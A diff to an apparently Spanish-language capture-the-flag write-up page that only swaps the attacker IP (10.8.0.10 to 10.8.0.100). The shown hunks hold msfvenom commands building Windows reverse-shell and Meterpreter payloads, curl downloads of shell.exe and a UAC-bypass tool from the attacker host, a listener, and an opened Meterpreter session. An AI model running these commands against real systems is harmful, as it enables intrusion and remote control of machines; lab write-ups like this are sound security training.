@@ -644,7 +644,7 @@ cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
 
 <p class="plain-text">Ya que podemos ejecutar un shellcode con este exploit solo nos queda generar un nuevo shellcode usando <code class="language-plaintext highlighter-rouge">msfvenom</code> que envie una reverse shell por el puerto <code class="language-plaintext highlighter-rouge">443</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/shell_reverse_tcp LHOST=10.8.0.10 LPORT=443 -b </span><span class="am">'\x00\x0a\x0d'</span><span class="p"> -f python -v shellcode -e x86/jmp_call_additive  
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/shell_reverse_tcp LHOST=10.8.0.100 LPORT=443 -b </span><span class="am">'\x00\x0a\x0d'</span><span class="p"> -f python -v shellcode -e x86/jmp_call_additive  
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 Found 1 compatible encoders
@@ -820,7 +820,7 @@ C:\rainbow></span>
 
 <p class="plain-text">Para bypassear el <code class="language-plaintext highlighter-rouge">UAC</code> utilizaremos la herramienta <a href="https://github.com/Kudaes/Elevator">elevator</a>, definimos un listener en <code class="language-plaintext highlighter-rouge">msfconsole</code> y creamos un payload para ejecutar dentro de un <code class="language-plaintext highlighter-rouge">.exe</code> con <code class="language-plaintext highlighter-rouge">msfvenom</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.0.10 LPORT=4444 -f exe -o shell.exe  
+<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.0.100 LPORT=4444 -f exe -o shell.exe  
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
@@ -844,14 +844,14 @@ lhost => tun0
 lport => 4444
 [</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0</span><span class="az"> Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> run
 
-</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.8.0.10:4444</span>
+</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.8.0.100:4444</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Descargamos los archivos y ejecutamos el <a href="https://github.com/Kudaes/Elevator">elevator</a> pasandole como comando a ejecutar el <code class="language-plaintext highlighter-rouge">shell.exe</code>, lo ejecutamos y esto deberia ejecutarse bypasseando <code class="language-plaintext highlighter-rouge">UAC</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">C:\ProgramData> </span><span class="am">curl</span><span class="p"> 10.8.0.10/shell.exe </span><span class="c1">-o</span><span class="p"> shell.exe
+<code><span class="p">C:\ProgramData> </span><span class="am">curl</span><span class="p"> 10.8.0.100/shell.exe </span><span class="c1">-o</span><span class="p"> shell.exe
 
-C:\ProgramData> </span><span class="am">curl</span><span class="p"> 10.8.0.10/elevator.exe</span><span class="c1"> -o</span><span class="p"> elevator.exe
+C:\ProgramData> </span><span class="am">curl</span><span class="p"> 10.8.0.100/elevator.exe</span><span class="c1"> -o</span><span class="p"> elevator.exe
 
 C:\ProgramData> </span><span class="am">elevator.exe </span><span class="az">"C:\ProgramData\shell.exe" </span><span class="c1">--new-console</span><span class="p">  
 [+] Unelevatad notepad.exe process created.
@@ -869,9 +869,9 @@ C:\ProgramData></span>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0</span><span class="az"> Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> run
 
-</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.8.0.10:4444
+</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.8.0.100:4444
 </span><span class="az">[*] </span><span class="p">Sending stage (201798 bytes) to 10.10.122.10
-</span><span class="az">[*] </span><span class="p">Meterpreter session 1 opened (10.8.0.10:4444 -> 10.10.122.10:49867)  
+</span><span class="az">[*] </span><span class="p">Meterpreter session 1 opened (10.8.0.100:4444 -> 10.10.122.10:49867)  
 
 (</span><span class="ve">Meterpreter</span><span class="az"> 1</span><span class="p">)(C:\ProgramData) > getuid
 Server username: RAINBOW\rainbow
